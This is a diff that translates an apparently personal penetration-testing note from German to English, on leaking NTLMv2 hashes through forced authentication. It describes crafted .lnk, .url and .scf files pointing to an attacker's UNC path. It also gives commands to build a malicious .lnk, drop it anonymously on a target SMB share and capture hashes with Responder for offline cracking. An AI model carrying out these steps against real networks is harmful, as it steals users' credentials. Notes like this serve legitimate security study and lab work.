@@ -4,42 +4,42 @@ aliases: [Forced Authentication, LNK Hash Leak, NTLM, NTLMv2]
 ---
 # NTLM Hash Leak (Forced Authentication)
 
-> Windows gegen einen **UNC-Pfad zu dir** (`\\<attacker-ip>\share`) authentifizieren lassen → es schickt automatisch den NTLMv2-Hash, den du abfängst und crackst.
+> Windows is made to authenticate against a **UNC path to the attacker** (`\\<attacker-ip>\share`) → it automatically sends the NTLMv2 hash, which is captured and cracked.
 
-## Hintergrund: NTLM
-NTLM ist das Windows-Verfahren, mit dem ein System beim Ressourcen-Zugriff (SMB-Shares, RDP, Windows-Auth-Websites) beweist, **wer der Nutzer ist**. Ablauf (Challenge-Response):
-1. Client sendet **Username** an den Server.
-2. Server schickt eine **zufällige Challenge** zurück.
-3. Client verschlüsselt die Challenge mit seinem **Passwort-Hash** → NTLMv2-Response.
-4. Server prüft die Antwort.
+## Background: NTLM
+NTLM is the Windows mechanism by which a system proves **who the user is** when accessing a resource (SMB shares, RDP, Windows-auth websites). Flow (challenge-response):
+1. Client sends the **username** to the server.
+2. Server sends back a **random challenge**.
+3. Client encrypts the challenge with its **password hash** → NTLMv2 response.
+4. Server verifies the response.
 
-=> Über die Leitung geht nur der **Response** (Challenge + Hash-Berechnung), nie das Passwort.
+=> Only the **response** (challenge + hash computation) goes over the wire, never the password.
 
-Angriffsfläche für diese Technik:
-- Der mitgeschnittene **NTLMv2-Response** lässt sich **offline cracken** → [[Hash Cracking]] (Format `netntlmv2`).
-- Windows authentifiziert sich teils **automatisch** gegen UNC-Pfade (`\\host\share`) — genau das wird hier erzwungen.
+Attack surface for this technique:
+- The captured **NTLMv2 response** can be **cracked offline** → [[Hash Cracking]] (format `netntlmv2`).
+- Windows sometimes authenticates **automatically** against UNC paths (`\\host\share`) — exactly what is forced here.
 
-## Prinzip
-1. Datei/Ressource verweist auf `\\<attacker-ip>\...`
-2. Opfer löst die Auflösung aus (Öffnen, **Vorschau**, teils nur Rechtsklick).
-3. Windows authentifiziert sich automatisch → Hash geht an deinen Listener ([[Responder]]).
-4. Hash offline cracken → [[Hash Cracking]].
+## Principle
+1. A file/resource points to `\\<attacker-ip>\...`
+2. The victim triggers the resolution (open, **preview**, sometimes just a right-click).
+3. Windows authenticates automatically → the hash goes to the listener ([[Responder]]).
+4. Crack the hash offline → [[Hash Cracking]].
 
-## Vektoren
-| Typ        | Auslöser                                             |
+## Vectors
+| Type       | Trigger                                              |
 | ---------- | ---------------------------------------------------- |
-| `.lnk`     | **Rechtsklick/Preview** (2025er Research) – kein CVE  |
-| `.url`     | Datei mit `URL=file://\\attacker\...`                |
-| `.scf`     | Icon lädt von UNC-Pfad                               |
-| SMB-Share  | präparierte Datei auf beschreibbarem Share ablegen   |
+| `.lnk`     | **right-click/preview** (2025 research) – no CVE     |
+| `.url`     | file with `URL=file://\\attacker\...`                |
+| `.scf`     | icon loads from a UNC path                           |
+| SMB share  | place a crafted file on a writable share             |
 
 > [!note] Mark of the Web
-> MS blockt den `.lnk`-Vektor nur bei **aus dem Internet geladenen** Dateien (MotW). Dateien auf **internen Shares** tragen kein MotW → weiterhin verwundbar.
+> MS only blocks the `.lnk` vector for files **downloaded from the internet** (MotW). Files on **internal shares** carry no MotW → still vulnerable.
 
-## `.lnk` unter Linux bauen
+## Building a `.lnk` on Linux
 ```bash
-x86_64-w64-mingw32-gcc -o poc poc.c   # poc.c zeigt auf \\<tun0-ip>\share
-wine poc.exe                          # erzeugt poc.lnk
-smbclient //<ziel>/share -N -c 'put poc.lnk'
+x86_64-w64-mingw32-gcc -o poc poc.c   # poc.c points to \\<tun0-ip>\share
+wine poc.exe                          # creates poc.lnk
+smbclient //<target>/share -N -c 'put poc.lnk'
 ```
-Dann [[Responder]] laufen lassen und auf die Auth warten.
+Then run [[Responder]] and wait for the auth.
